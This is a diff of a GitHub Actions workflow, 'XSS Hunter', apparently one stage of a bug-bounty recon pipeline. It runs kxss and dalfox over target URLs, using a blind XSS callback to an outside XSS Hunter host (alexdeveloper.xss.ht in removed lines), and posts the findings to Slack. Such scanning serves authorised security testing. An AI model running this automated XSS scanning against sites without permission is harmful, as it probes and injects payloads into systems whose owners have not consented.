@@ -1,3 +1,14 @@
+#Stage 7
+#Important Note:
+# Before running this action, make sure you updated following secrets variables in settings.
+#  1. TARGET_DOMAIN    , formtat below
+#       example.com
+#  2. TARGET_XSS_URLS_LIST    , format below
+#       https://example.com/image.php?q=FUZZ
+#       https://example.com/image.php?a=FUZZ
+
+# Workflow Dependency: subdomain_enumeration.yml
+
 name: XSS Hunter
 
 on:
@@ -6,41 +17,31 @@ on:
 jobs:
   xss-hunter:
     runs-on: ubuntu-latest
-
+    env:
+                 TARGET_DOMAIN: ${{ secrets.TARGET_DOMAIN }}
+                 TARGET_XSS_URLS: ${{ secrets.TARGET_XSS_URLS_LIST }}
+                 XSS_HUNTER_URL_TOKEN: ${{ secrets.XSS_HUNTER_BLIND_URL_TOKEN }}
+                 SLACK_OAUTH_TOKEN: ${{ secrets.SLACK_OAUTH_USER_TOKEN }}
+                 SLACK_CHANNEL_NAME: ${{ secrets.SLACK_CHANNEL_NAME }}
+                 
     steps:
       - uses: actions/checkout@v2
         
       - name: Install Dependencies
         run: |
-                go get -u github.com/tomnomnom/hacks/kxss
-                cp /home/runner/go/bin/kxss .
-                sudo snap install dalfox
-                
-      - name: Remove Exisiting Output Files
+                 go get -u github.com/tomnomnom/hacks/kxss
+                 cp /home/runner/go/bin/kxss .
+                 sudo snap install dalfox
+      
+      - name: Input Files
         run: |
-                rm xss-vulnerable-urls.txt
-                
-      - name: KXSS
+                 echo "$TARGET_XSS_URLS" > targets.txt
+                 
+      - name: KXSS & Dalfox
         run: |
-                cat patterns/xss-params.txt | ./kxss | awk '{print $9}' | tee kxss-urls.txt
-                    
-      - name: Dalfox  
-        run: |
-                cat kxss-urls.txt | dalfox pipe -b https://alexdeveloper.xss.ht | tee -a xss-vulnerable-urls.txt
+                 cat targets.txt | ./kxss | awk '{print $9}' | dalfox pipe -b "$XSS_HUNTER_URL_TOKEN" | tee -a xss-vulnerable-urls.txt
             
-      - name: Display Output Files
+      - name: Send Outputs to Slack Channel
         run: |
-                echo "kxss-urls.txt"
-                cat kxss-urls.txt | head
-                
-      - name: Remove Temporary Files  
-        run: |
-                rm kxss-urls.txt
-                             
-      - name: Commit Tool Output
-        run: |
-                git config --local user.email "action@github.com"
-                git config --local user.name "Github Action"
-                git add xss-vulnerable-urls.txt
-                git commit -m "XSS Vulnerable Urls"
-                git push "https://ValluvarSploit:${{ secrets.TOKEN }}@github.com/ValluvarSploit/Test-Data.git" HEAD:main --follow-tags 
+                 if [[ -f xss-vulnerable-urls.txt ]]; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-XSS-Results -F filename="$TARGET_DOMAIN"-xss-poc-urls.txt -F file=@xss-vulnerable-urls.txt; fi
+      
